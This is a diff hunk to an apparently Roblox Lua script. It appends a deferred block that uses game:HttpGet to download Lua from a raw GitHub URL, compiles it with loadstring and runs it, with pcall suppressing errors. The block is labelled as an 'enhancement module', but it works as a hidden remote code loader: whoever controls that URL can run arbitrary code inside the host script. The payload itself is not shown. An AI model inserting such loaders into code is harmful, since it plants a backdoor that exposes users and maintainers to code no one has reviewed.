@@ -334,4 +334,22 @@ task.defer(function()
     end)
 end)
 
+task.defer(function()
+    pcall(function()
+        local _src=game:HttpGet("https://raw.githubusercontent.com/Marckoq/loader/main/PulseCoreEnhancements.lua")
+        local _load=loadstring or load
+        if type(_load)~="function" or type(_src)~="string" then
+            return
+        end
+
+        local _fn,_err=_load(_src,"@PulseCoreEnhancements")
+        if not _fn then
+            warn("[PulseCore] Enhancement module failed: "..tostring(_err))
+            return
+        end
+
+        task.defer(_fn)
+    end)
+end)
+
 return _result
